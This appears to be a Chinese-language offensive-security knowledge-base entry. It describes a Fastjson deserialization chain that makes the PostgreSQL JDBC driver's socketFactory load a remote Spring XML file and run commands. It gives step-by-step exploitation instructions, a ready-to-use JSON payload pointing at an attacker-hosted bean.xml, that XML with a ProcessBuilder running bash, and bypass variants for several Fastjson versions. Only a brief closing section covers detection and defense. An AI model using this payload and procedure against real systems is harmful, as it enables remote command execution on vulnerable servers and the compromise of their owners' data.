---
id: web-java-deser-fastjson-postgres-pgconnection-xml-rce
title: Fastjson 触发 PostgreSQL PgConnection socketFactory 加载远程 Spring XML 执行命令
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-postgres-pgconnection-xml
aliases:
- PostgreSQL JDBC 反序列化
- PgConnection socketFactory
- ClassPathXmlApplicationContext PgConnection
- postgresql fastjson RCE
- Spring XML ProcessBuilder
tags:
- java
- fastjson
- deserialization
- jdbc
- postgresql
- spring
- xml
- socketfactory
- rce
cve: []
severity: critical
confidence: high
status: draft
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: 9.4.1208 <= org.postgresql:postgresql < 42.2.25；42.3.0 <= org.postgresql:postgresql < 42.3.2（原文标记）
---

## 一句话结论

Fastjson 实例化 `org.postgresql.jdbc.PgConnection` 时，把 `socketFactory` 设为 `org.springframework.context.support.ClassPathXmlApplicationContext`、`socketFactoryArg` 设为攻击者托管的 Spring XML URL；PostgreSQL 驱动创建 socket 时会用该工厂加载远程 XML，XML 中的 `ProcessBuilder` bean 通过 `init-method="start"` 执行命令。

## 原理

PostgreSQL JDBC 在建立连接时会根据 `socketFactory` 属性反射实例化 SocketFactory，并把 `socketFactoryArg` 作为构造参数传入。如果 `socketFactory` 指向 Spring 的 `ClassPathXmlApplicationContext`，构造参数就是 XML 资源地址；Spring 会加载该 XML、实例化 bean。

攻击者 XML 定义一个 `java.lang.ProcessBuilder` bean，`init-method="start"`，constructor-arg 为命令参数列表。Spring 实例化 bean 时调用 `start()`，命令执行。整个过程不需要目标出网到数据库，只需要能访问攻击者的 XML HTTP 服务（或本地 file: XML）。

Fastjson 侧只需让 `PgConnection` 被实例化并触发连接逻辑。`PgConnection` 实现 `AutoCloseable`，因此可走 1.2.68 的双 `@type` 期望类绕过；1.2.80 可结合 jackson 缓存把 `PgConnection` 作为 `@type` 拉起。

## 触发条件

- 目标 classpath 存在受影响版本 PostgreSQL JDBC 驱动；
- classpath 存在 Spring Context（`ClassPathXmlApplicationContext`）；
- 目标能访问攻击者 XML 服务（http/file）；
- Fastjson 反序列化点能加载 `PgConnection`（1.2.68 `AutoCloseable` 或 1.2.80 缓存路线）；
- 目标进程有执行命令的权限。

## 利用步骤

1. 依赖探测确认 PostgreSQL 驱动版本与 Spring 存在；
2. 托管恶意 XML：`ProcessBuilder` bean，`init-method="start"`，参数为 `bash -c <cmd>`（Windows 用 `cmd /c`）；
3. 构造 Fastjson JSON，实例化 `PgConnection`，`hostSpecs` 指向任意地址，`user`/`database` 填值；
4. 在 `info` 中设置 `socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext`、`socketFactoryArg=http://ATTACKER/bean.xml`；
5. 目标创建连接时加载 XML，ProcessBuilder 启动命令；
6. 无出网时把 XML 放到本地可读路径，`socketFactoryArg` 用 `file:`。

## PoC

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.postgresql.jdbc.PgConnection",
    "hostSpecs": [{"host": "127.0.0.1", "port": 2333}],
    "user": "user",
    "database": "test",
    "info": {
      "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
      "socketFactoryArg": "http://ATTACKER:8080/bean.xml"
    },
    "url": ""
  }
}
```

`bean.xml`：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value><![CDATA[id > /tmp/pwn]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

## 变体与关联

- 1.2.80 路线：先用 `InputCoercionException` 缓存 `JsonParser`/`UTF8StreamJsonParser`，第二段用 `java.io.InputStream` + `PGCopyInputStream` 包住 `PgConnection`，让 JDBC 链在 1.2.80 也可达。
- Jython 依赖路线：用 `org.python.core.PyObject` + `com.ziclix.python.sql.PyConnection` 包 `PgConnection`。
- socketFactory 可换成其他可加载远程资源的工厂类；XML 可用 `file:` 本地路径。
- 关联：[[web-java-deser-fastjson-mysql-jdbc-autodeserialize]]（另一条 JDBC 驱动链）；[[web-java-deser-fastjson-1268-autocloseable-expectclass-file-rw]]、[[web-java-deser-fastjson-1280-exception-deserializer-cache-bypass]]（外层触发）。

## 检测与防御

- 检测：JSON 中出现 `PgConnection`、`socketFactory`、`ClassPathXmlApplicationContext`、`socketFactoryArg`；目标向外部拉取 XML；Spring 容器加载非预期 XML；进程出现异常 `ProcessBuilder` 启动。
- 防御：升级 PostgreSQL 驱动到修复版本（42.2.25+/42.3.2+）；升级 fastjson、开启 SafeMode；对 `@type` 做白名单；禁止 JDBC 连接属性由不可信输入控制；限制出网与 XML 外部加载。
- 注意：该链依赖 Spring Context 与 PostgreSQL 驱动同时存在；仅关闭 AutoType 不足以阻止期望类/缓存路线。
